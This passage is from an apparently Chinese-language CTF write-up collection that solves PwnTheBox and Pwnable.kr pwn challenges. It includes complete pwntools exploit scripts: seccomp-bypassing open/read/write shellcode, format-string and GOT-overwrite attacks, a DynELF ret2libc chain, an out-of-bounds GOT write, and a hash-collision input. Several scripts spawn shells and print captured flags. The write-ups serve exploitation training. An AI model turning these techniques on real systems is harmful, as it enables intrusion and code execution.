[*] '/home/tyd/ctf/pwn/pwnthebox/orw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

使用`IDA pro 32bit`打开附件`orw`，按`F5`反汇编源码并查看主函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

双击`orw_seccomp()`函数，详情如下：

```c
unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h] BYREF
  char *v2; // [esp+8h] [ebp-80h]
  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(v3, &unk_8048640, sizeof(v3));
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}
```

`prctl(38, 1, 0, 0, 0);`表示禁止提权，比如`system`和`onegadget`都不能用了。`prctl(22, 2, &v1);`限制了能执行系统调用的函数。`seccomp`是`Linux`系统的一种安全机制，主要功能是限制直接通过`syscall`去调用某些系统函数。我们可以用`seccomp-tools`去分析程序的`seccomp`状态。

```bash
sudo gem install seccomp-tools
```

通过`seccomp-tools`发现可以使用`open`，`read`，`write`这三个函数。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

返回主函数，双击`shellcode`变量跳转到`.bss`段，`shellcode`直接写入到起始地址为`0x804A060`的`.bss`段。

```assembly
.bss:0804A060                 public shellcode
.bss:0804A060 shellcode       db    ? ;               ; CODE XREF: main+42↑p
......
.bss:0804A127 _bss            ends
```

`open`打开`flag`文件，`read`读取`flag`中的文件到`esp`寄存器中，`write`将`esp`中`flag`文件内容写入到标准输出中进行输出显示。编写`Python`代码连接`redirect.do-not-trust.hacking.run`的监听端口`10119`，发送`shellcode`可得`PTB{921a8cae-fd37-403e-b86e-f0fccd06e17f}`，提交即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10119)
bss_addr = 0x804A060
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('eax', 'esp', 0x100)
shellcode += shellcraft.write(1, 'esp', 0x100)
shellcode += shellcraft.exit(0)
io.sendline(asm(shellcode))
io.interactive()
```

------

### ♥ [[第五空间2019 决赛]PWN5](https://ce.pwnthebox.com/challenges?id=369)

先`file ./PWN51  `查看文件类型，再`checksec --file=./PWN51  `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./PWN51
./PWN51: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./PWN51
[*] '/home/tyd/ctf/pwn/pwnthebox/PWN51'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开`PWN51`后按`F5`反汇编源码并查看主函数。程序首先生成一个随机值并读取到在`.bss`段存储的`dword_804C044`变量中，然后将用户输入读取到`buf`变量中并进行输出，`buf`变量长度为`0x70`字节，`read`函数读取时限制的输入为`0x63`字节，并不存在栈溢出漏洞，但是`printf`函数存在格式化字符串漏洞。接着将用户的下个输入读取到`nptr`变量中，如果`nptr`变量转换成整型后的数值，和`.bss:0804C044`字段中`dword_804C044`变量保存的随机值相等，即可获取到靶机的`shell`权限。

```c
int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  else
  {
    puts("fail");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
    sub_80493D0();
  return result;
}
```

使用`gdb ./pwn`对程序进行调试，这里我用的是`pwndbg`，在`printf`处设置断点`b printf`，`run`运行程序后使用`stack 20`查看栈，可以得知格式化字符串的偏移量是`10`。

```bash
pwndbg> b printf
Breakpoint 1 at 0x8049040
pwndbg> run
Starting program: /home/tyd/ctf/pwn/buuctf/pwn 

Breakpoint 1, __printf (format=0x804a015 "your name:") at printf.c:32
32      printf.c: 没有那个文件或目录.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
 EAX  0x804a015 ◂— 'your name:'
 EBX  0x804c000 —▸ 0x804bf10 ◂— 0x1
 ECX  0x804c044 ◂— 0xf2df338f
 EDX  0x4
 EDI  0x80490e0 ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0xffffd108 ◂— 0x0
 ESP  0xffffd06c —▸ 0x804928d ◂— add    esp, 0x10
 EIP  0xf7e08f10 (printf) ◂— call   0xf7efa189
────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
 ► 0xf7e08f10 <printf>       call   __x86.get_pc_thunk.ax                    <__x86.get_pc_thunk.ax>
        arg[0]: 0x804928d ◂— add    esp, 0x10
        arg[1]: 0x804a015 ◂— 'your name:'
        arg[2]: 0x804c044 ◂— 0xf2df338f
        arg[3]: 0x4
 
   0xf7e08f15 <printf+5>     add    eax, 0x19a0df
   0xf7e08f1a <printf+10>    sub    esp, 0xc
   0xf7e08f1d <printf+13>    lea    edx, [esp + 0x14]
   0xf7e08f21 <printf+17>    push   0
   0xf7e08f23 <printf+19>    push   edx
   0xf7e08f24 <printf+20>    push   dword ptr [esp + 0x18]
   0xf7e08f28 <printf+24>    mov    eax, dword ptr [eax - 0x60]
   0xf7e08f2e <printf+30>    push   dword ptr [eax]
   0xf7e08f30 <printf+32>    call   __vfprintf_internal                    <__vfprintf_internal>
 
   0xf7e08f35 <printf+37>    add    esp, 0x1c
───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ esp 0xffffd06c —▸ 0x804928d ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a015 ◂— 'your name:'
02:0008│     0xffffd074 —▸ 0x804c044 ◂— 0xf2df338f
03:000c│     0xffffd078 ◂— 0x4
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
──────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► f 0 0xf7e08f10 printf
   f 1 0x804928d
   f 2 0xf7dd3905 __libc_start_main+229
   f 3 0x8049112
────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
your name:AAAA   

Breakpoint 1, __printf (format=0x804a020 "Hello,") at printf.c:32
32      in printf.c
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────
*EAX  0x804a020 ◂— 'Hello,'
 EBX  0x804c000 —▸ 0x804bf10 ◂— 0x1
*ECX  0xffffd098 ◂— 'AAAA\n'
*EDX  0x63
 EDI  0x80490e0 ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0xffffd108 ◂— 0x0
 ESP  0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
 EIP  0xf7e08f10 (printf) ◂— call   0xf7efa189
───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
 ► 0xf7e08f10 <printf>       call   __x86.get_pc_thunk.ax                    <__x86.get_pc_thunk.ax>
        arg[0]: 0x80492b2 ◂— add    esp, 0x10
        arg[1]: 0x804a020 ◂— 'Hello,'
        arg[2]: 0xffffd098 ◂— 'AAAA\n'
        arg[3]: 0x63
 
   0xf7e08f15 <printf+5>     add    eax, 0x19a0df
   0xf7e08f1a <printf+10>    sub    esp, 0xc
   0xf7e08f1d <printf+13>    lea    edx, [esp + 0x14]
   0xf7e08f21 <printf+17>    push   0
   0xf7e08f23 <printf+19>    push   edx
   0xf7e08f24 <printf+20>    push   dword ptr [esp + 0x18]
   0xf7e08f28 <printf+24>    mov    eax, dword ptr [eax - 0x60]
   0xf7e08f2e <printf+30>    push   dword ptr [eax]
   0xf7e08f30 <printf+32>    call   __vfprintf_internal                    <__vfprintf_internal>
 
   0xf7e08f35 <printf+37>    add    esp, 0x1c
────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ esp 0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a020 ◂— 'Hello,'
02:0008│     0xffffd074 —▸ 0xffffd098 ◂— 'AAAA\n'
03:000c│     0xffffd078 ◂— 0x63 /* 'c' */
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────
 ► f 0 0xf7e08f10 printf
   f 1 0x80492b2
   f 2 0xf7dd3905 __libc_start_main+229
   f 3 0x8049112
────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 20
00:0000│ esp 0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a020 ◂— 'Hello,'
02:0008│     0xffffd074 —▸ 0xffffd098 ◂— 'AAAA\n'
03:000c│     0xffffd078 ◂— 0x63 /* 'c' */
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
08:0020│     0xffffd08c ◂— 0x1
09:0024│     0xffffd090 ◂— 0x0
0a:0028│     0xffffd094 ◂— 0x1
0b:002c│ ecx 0xffffd098 ◂— 'AAAA\n'
0c:0030│     0xffffd09c ◂— 0xa /* '\n' */
0d:0034│     0xffffd0a0 ◂— 0x0
... ↓        5 skipped
13:004c│     0xffffd0b8 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x31f1c
```

知道格式化字符串漏洞的偏移量后，这题有两个解题思路：

- 修改`dword_804C044`字段中的内容，这样能在`if`条件`atoi(nptr) == dword_804C044`为真时，成功执行`system("/bin/sh")`。
- 利用`fmtstr_payload`将`atoi`函数地址修改为`system`函数地址，当输入的`nptr`为`/bin/sh`时，就能在`if`条件中的`atoi(nptr)`处成功执行`system("/bin/sh")`。

第一种解法：利用格式化字符串`%n`的特性修改`dword_804C044`字段中的内容，`bss_addr = 0x804C044`共`4`个字节，我们先把这个地址写到栈偏移量为`10`的地址，然后利用`%10$n`把`0x804C044`的字节长度`4`写入到`%10$n`处指针所指的地址`0x804C044`中去，这样做的话，字段`dword_804C044`中的内容就修改成功了，最后输入的`nptr`为`4`时就能使`if`条件`atoi(nptr) == dword_804C044`为真，从而执行`system("/bin/sh")`获取到靶机的`shell`权限，输入`cat flag`可以得到`flag{d1aa727e-1027-4f25-a218-060c904ba5ce}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10247)
bss_addr = 0x804C044
payload = p32(bss_addr) + b'%10$n'
io.sendline(payload)
io.sendline(b'4')
io.interactive()
```

第二种解法：在`Functions window`中看到有`system`函数，我们可以利用格式化字符串漏洞将`atoi`函数篡改为`system`函数，当用户在`"your passwd:"`后输入`/bin/sh`时，程序原来的`atoi(nptr)`就变成了`system("/bin/sh")`，从而获取到靶机的`shell`权限，输入`cat flag`可以得到`flag{d1aa727e-1027-4f25-a218-060c904ba5ce}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10247)
e = ELF('./PWN51')
atoi_got = e.got['atoi']
system_plt = e.plt['system']
payload = fmtstr_payload(10, {atoi_got: system_plt})
io.sendline(payload)
io.sendline(b'/bin/sh\x00')
io.interactive()
```

------

### [jarvisoj_level4](https://ce.pwnthebox.com/challenges?id=555)

先`file ./level4`查看文件类型，再`checksec --file=./level4`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./level4         
./level4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44cfbcb6b7104566b4b70e843bc97c0609b7a018, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./level4         
[*] '/home/tyd/ctf/pwn/buuctf/level4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`level4`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF
  return read(0, buf, 0x100u);
}
```

`DynELF`函数能通过已知函数迅速查找`libc`库，并不需要我们知道`libc`文件的版本，也不像使用`LibcSearcher`那样需要选择`libc`的版本。`DynELF`函数的使用前提是程序中存在可以泄露libc信息的漏洞，并且漏洞可以被反复触发。我们利用`DynELF`函数泄露出`system`函数的地址后，还需要知道`/bin/sh`的地址，程序中并没有`/bin/sh`，所以`ROPgadget`无法找到。程序是`NX enabled`，即开启了堆栈不可执行，但`/bin/sh`是参数并不是要执行的函数。我们可以利用`read`函数把`/bin/sh`读入到程序的`.bss`段中，然后使用`system`函数调用即可得到靶机的`shell`。

编写`Python`代码求解可得`flag{44724d0a-a417-431b-b012-bafca1d45411}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10248)
elf = ELF('./level4')
main_addr = elf.symbols['main']  # 0x8048470
write_plt = elf.plt['write']  # 0x8048340
read_plt = elf.plt['read']  # 0x8048310
bss_addr = elf.bss()  # 0x804a024
padding = b'a'*(0x88+0x4)

def leak(address):
    payload = padding + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4)
    io.sendline(payload)
    leaked = io.recv(4)
    log.info("[%#x] => %s = %s" % (address, repr(leaked), hex(u32(leaked))))
    return leaked


libc = DynELF(leak, elf=elf)
system_addr = libc.lookup('system', 'libc')
log.success('system_address => %#x' % system_addr)
payload = padding + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
io.send(payload)
io.send('/bin/sh\x00')
payload = padding + p32(system_addr) + p32(main_addr) + p32(bss_addr)
io.sendline(payload)
io.interactive()
```

------

### [name your dog](https://ce.pwnthebox.com/challenges?id=1777)

先`file ./wustctf2020_name_your_dog`查看文件类型，再`checksec --file=./wustctf2020_name_your_dog `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./wustctf2020_name_your_dog
./wustctf2020_name_your_dog: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9615fb1408f3d1f6091c2018310bf9170bc6abd0, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./wustctf2020_name_your_dog
[*] '/home/tyd/ctf/pwn/pwnthebox/wustctf2020_name_your_dog'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`wustctf2020_name_your_dog`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`函数查看详情：

```c
int vulnerable()
{
  int result; // eax
  int i; // [esp+8h] [ebp-10h]
  int v2; // [esp+Ch] [ebp-Ch]

  result = puts("I bought you five male dogs.Name for them?");
  for ( i = 1; i <= 5; ++i )
  {
    v2 = NameWhich(&Dogs);
    printf("You get %d dogs!!!!!!\nWhatever , the author prefers cats ^.^\n", i);
    result = printf("His name is:%s\n\n", (const char *)(8 * v2 + 134520928));
  }
  return result;
}
```

双击`NameWhich()`函数查看详情，注意到程序并没有检查数组边界，`v2`可以任意输入，存在数组越界，我们可以通过`v2`的值对程序任意写入。程序调用`NameWhich()`函数时传递的实参为`Dogs`数组，`Dogs`在`.bss`段中存放，数组起始地址为`0x804A060`。

```c
int __cdecl NameWhich(int a1)
{
  int v2[4]; // [esp+18h] [ebp-10h] BYREF

  v2[1] = __readgsdword(0x14u);
  printf("Name for which?\n>");
  __isoc99_scanf("%d", v2);
  printf("Give your name plz: ");
  __isoc99_scanf("%7s", 8 * v2[0] + a1);
  return v2[0];
}
```

注意到`Functions window`中存在后门函数`shell()`，返回值直接系统调用`/bin/sh`，该函数地址为`0x80485CB`。

```c
int shell()
{
  return system("/bin/sh");
}
```

查看程序的`got`表信息，发现`scanf()`函数距离`Dogs`数组的起始地址很近，`(0x804a028 - 0x804A060)/8 = -7`，数组偏移量为`-7`。我们可以通过数组越界来修改`got`表中`scanf()`函数所在地址存放的内容，将内容覆盖为后门函数`shell()`的地址，这样程序在下一次循环访问`scanf`的`got`表中的内容时，就能跳转到后门函数执行。

```bash
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 8
 
[0x804a00c] printf@GLIBC_2.0 -> 0xf7e07f10 (printf) ◂— call   0xf7ef9189    # printf函数
[0x804a010] alarm@GLIBC_2.0 -> 0xf7e7dcd0 (alarm) ◂— mov    edx, ebx
[0x804a014] __stack_chk_fail@GLIBC_2.4 -> 0x8048466 (__stack_chk_fail@plt+6) ◂— push   0x10
[0x804a018] puts@GLIBC_2.0 -> 0xf7e234e0 (puts) ◂— push   ebp  # puts函数
[0x804a01c] system@GLIBC_2.0 -> 0x8048486 (system@plt+6) ◂— push   0x20 /* 'h ' */
[0x804a020] __libc_start_main@GLIBC_2.0 -> 0xf7dd2820 (__libc_start_main) ◂— call   0xf7ef9189
[0x804a024] setvbuf@GLIBC_2.0 -> 0xf7e23c90 (setvbuf) ◂— call   0xf7ef9189
[0x804a028] __isoc99_scanf@GLIBC_2.7 -> 0xf7e08ff0 (__isoc99_scanf) ◂— call   0xf7ef9189  # scanf函数
```

编写`Python`代码求解得到`PTB{7a2adc41-67c7-45d2-bb5f-a547fb78b67b}`。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10250)
elf = ELF('./wustctf2020_name_your_dog')
shell = elf.symbols['shell']
io.sendlineafter(b'Name for which?\n>', b'-7')
io.sendlineafter(b'Give your name plz:', p32(shell))
io.interactive()
```

------

## Pwnable.kr

### fd

这是**Pwnable.kr**的第一个挑战`fd`，来自**[Toddler's Bottle]**部分。题目描述中可以看到有个小孩在问他妈什么是Linux中的文件描述符，现在可以知道标题`fd`就是`file descriptor`的缩写。

```bash
Mommy! what is a file descriptor in Linux?

* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
https://youtu.be/971eZhMHQQw

ssh fd@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/1.png)

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/2.png)

我们可以看到三个文件`fd`、`fd.c`和`flag`，其中`fd`是`ELF`二进制可执行文件，`fd.c`是编译二进制文件的`C`代码，用户`fd`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat fd.c`来查看`fd.c`的代码。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/3.png)

我们通过代码审计可以看到变量`buf`被分配了`32`个字节作为缓冲区，该程序首先检查用户是否输入了两个参数(包括文件名)，如果没有就会得到一条`printf`输出语句提示需要给该可执行文件传递一个参数。

然后我们发现有个`int`型变量`fd`被赋值为`atoi(argv[1])-0x1234`，即用户输入的数字被`atoi()`函数转换成`int`型后与`0x1234`的差值。此外还有一个`int`型变量`len`的值是`read(fd, buf, 32)`的函数返回值。在`Linux`机器和`C`语言中，`Linux`文件描述符的值为`0`表示标准输入`stdin`，`1`表示标准输出`stdout`，`2`表示标准错误`stderr`。当`fd`的值为`0`的时候，程序将从`stdin`中读入`32`个字节数据到`buf`变量中，因此我们输入的参数应该是`0x1234`的十进制值`4660`。

接着有一个字符串比较函数`strcmp()`，如果`buf`变量的值等于字符串`LETMEWIN`的话，`strcmp()`函数返回值就为0，此时`if`条件就为真，程序会系统调用输出`flag`：`mommy! I think I know what a file descriptor is!!`。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/4.png)

有了以上思路后，我们也可以编写`Python`代码来获取`flag`：`mommy! I think I know what a file descriptor is!!`。

```python
from pwn import *

shell = ssh(user='fd', host='pwnable.kr', port=2222, password='guest')
io = shell.process(executable='./fd', argv=['fd', '4660'])
io.sendline(b'LETMEWIN')
io.interactive()
```

![](https://paper.tanyaodan.com/Pwnable/kr/fd/5.png)

------

### collision

这是**Pwnable.kr**的第二个挑战`collision`，来自**[Toddler's Bottle]**部分。题目描述中可以看到有个小孩说他爸今天告诉了他什么是MD5散列冲突。

```bash
Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!

ssh col@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh col@pwnable.kr -p2222 
col@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Thu Jun  8 03:55:34 2023 from 188.64.206.152
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
col@pwnable:~$ ls -la
total 36
drwxr-x---   5 root    col     4096 Oct 23  2016 .
drwxr-xr-x 117 root    root    4096 Nov 10  2022 ..
d---------   2 root    root    4096 Jun 12  2014 .bash_history
-r-sr-x---   1 col_pwn col     7341 Jun 11  2014 col
-rw-r--r--   1 root    root     555 Jun 12  2014 col.c
-r--r-----   1 col_pwn col_pwn   52 Jun 11  2014 flag
dr-xr-xr-x   2 root    root    4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root    root    4096 Oct 23  2016 .pwntools-cache
```

我们可以看到三个文件`col`、`col.c`和`flag`，其中`col`是`ELF`二进制可执行文件，`col.c`是编译二进制文件的`C`代码，用户`col`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat col.c`来查看`col.c`的代码。

```bash
col@pwnable:~$ cat col.c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i<5; i++){
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]){
    if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if(hashcode == check_password( argv[1] )){
        system("/bin/cat flag");
        return 0;
    }
    else
        printf("wrong passcode.\n");
    return 0;
}
```

先来看主函数，通过代码审计可知，我们需要输入一个长度为`20`个字节的密码，然后程序会将输入的密码送入到`check_password()`函数中进行执行，如果函数的返回值等于硬编码的哈希值`0x21DD09EC`则输出`flag`中的内容。我们可以使用`gdb`来进一步了解程序。

```bash
col@pwnable:~$ gdb ./col
(gdb) disass check_password  # disassemble
Dump of assembler code for function check_password:
   0x08048494 <+0>:     push   %ebp
   0x08048495 <+1>:     mov    %esp,%ebp
   0x08048497 <+3>:     sub    $0x10,%esp
   0x0804849a <+6>:     mov    0x8(%ebp),%eax
   0x0804849d <+9>:     mov    %eax,-0x4(%ebp)
   0x080484a0 <+12>:    movl   $0x0,-0x8(%ebp)
   0x080484a7 <+19>:    movl   $0x0,-0xc(%ebp)
   0x080484ae <+26>:    jmp    0x80484c2 <check_password+46>
   0x080484b0 <+28>:    mov    -0xc(%ebp),%eax
   0x080484b3 <+31>:    shl    $0x2,%eax
   0x080484b6 <+34>:    add    -0x4(%ebp),%eax
   0x080484b9 <+37>:    mov    (%eax),%eax
   0x080484bb <+39>:    add    %eax,-0x8(%ebp)
   0x080484be <+42>:    addl   $0x1,-0xc(%ebp)
   0x080484c2 <+46>:    cmpl   $0x4,-0xc(%ebp)
   0x080484c6 <+50>:    jle    0x80484b0 <check_password+28>
   0x080484c8 <+52>:    mov    -0x8(%ebp),%eax
   0x080484cb <+55>:    leave  
   0x080484cc <+56>:    ret    
End of assembler dump.
(gdb) b *0x80484cc  # break
Breakpoint 1 at 0x80484cc
(gdb) run "AAAAAAAAAAAAAAAAAAAA"
Starting program: /home/col/col "AAAAAAAAAAAAAAAAAAAA"

Breakpoint 1, 0x080484cc in check_password ()
(gdb) print $eax
$1 = 1179010629
(gdb) set $eax=0x21DD09EC
(gdb) print $eax
$2 = 568134124
(gdb) c
Continuing.
/bin/cat: flag: Permission denied
[Inferior 1 (process 58207) exited normally]
```

我们通过修改`check_password()`函数的返回值让程序执行了`system("/bin/cat flag");`，但是用户`col`并没有权限查看`flag`文件中的内容。根据`check_password()`函数，我们需要把`0x21DD09EC`划分为`5`份，但是`568134124`并不能被`5`整除，存在余数`4`。我们可以把余数放到第五份中，即数组变量`ip`中的数值为`[113626824, 113626824, 113626824, 113626824, 113626828]`。接着得把它们转换成十六进制：

```python
>>> hex(113626824)
'0x6c5cec8'
>>> hex(113626828)
'0x6c5cecc'
```

由于这些数据是小端存储方式，所以我们应该输入的值是`"\xc8\xce\xc5\x06" * 4 + "\xcc\xce\xc5\x06"`，编写`Python`代码求解，得到`flag`：`daddy! I just managed to create a hash collision :)`。

```python
from pwn import *

shell = ssh(user='col', host='pwnable.kr', port=2222, password='guest')
hashcode = 0x21DD09EC
a = hashcode//5     # 0x6c5cec8
b = a + hashcode%5  # 0x6c5cecc
payload = p32(a)*4 + p32(b)
# payload = p32(0x6c5cec8)*4 + p32(0x6c5cecc)
io = shell.process(executable='./col', argv=['col', payload])
flag = io.recv()
log.success(flag)  # daddy! I just managed to create a hash collision :)
io.close()
shell.close()
```

------

### bof

这是**Pwnable.kr**的第三个挑战`bof`，来自**[Toddler's Bottle]**部分。题目描述中可以看到这题要考察缓冲区溢出。

```bash
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

